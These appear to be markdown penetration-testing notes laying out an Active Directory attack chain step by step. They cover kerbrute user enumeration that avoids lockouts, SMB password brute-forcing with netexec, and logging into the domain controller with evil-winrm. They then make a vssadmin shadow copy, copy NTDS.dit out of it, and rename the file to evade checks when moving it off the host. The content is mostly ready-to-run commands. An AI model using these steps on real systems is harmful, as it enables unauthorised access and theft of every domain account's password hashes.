

## Enumerate Users in AD 

- Targets the AD network to identify valid usernames without triggering account lockouts or generating standard Windows logon failure alerts.
- `--dc` specifies the **domain controller** i.e the Windows server managing the entire AD network and `--domain` is the name of that AD network.

```bash
./kerbute_linux_amd64 userenum --dc <TARGET_IP> --domain <AD_DOMAIN_NAME> <wordlist>
```

## Bruteforce Attack AD

- After you get the username, use that to bruteforce attack on the SMB service and find the password of the user.
- Then use those credentials to log into the AD network.

```bash
netexec smb <TARGET_IP> -u <USERNAME> -p <wordlist>
```

## Capturing NTDS.dit

### 1. Connecting to DC

- Using the credentials gathered we can connect to the target domain controller itself.
- Normally access will be denied unless the user has certain privileges like **administrator** or **domain admin**.

```bash
evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'
```

### 2. Check User privileges

- The below command is used to find the privileges of the user, we used to login. If the user has **admin** rights then we can make a copy of `NTDS.dit` file. To do this the user needs to be part of `Administrators group` or `Domain Admins group`.

#### (a) User Group Privileges

```cmd
net localgroup
```

#### (b) User Account Privileges

```cmd
net user <USERNAME>
```

### 3. Creating shadow copy of C:

- Copy the disk where AD was installed. Most likely it gets installed in `C:` drive so use `vssadmin` to make a copy of that drive.
- creates a shadow copy of the `C:` drive. The shadow copy path will be shown use that in the copying of `NTDS.dit` from the VSS.

```cmd
vssadmin CREATE SHADOW /For=C:
```

### 4. Copying NTDS.dit from the VSS

- `/c` tells the `cmd.exe` to run `copy` command and immediately close itself when finished.

```cmd
cmd.exe /c copy <SHADOW FILE PATH>
```

### 5. Transferring NTDS.dit to attack host

- Checkout Windows to Linux transfer methods
- Before transferring rename the `NTDS.dit` file because AD might block the file from transferring by checking its name since its a critical file.


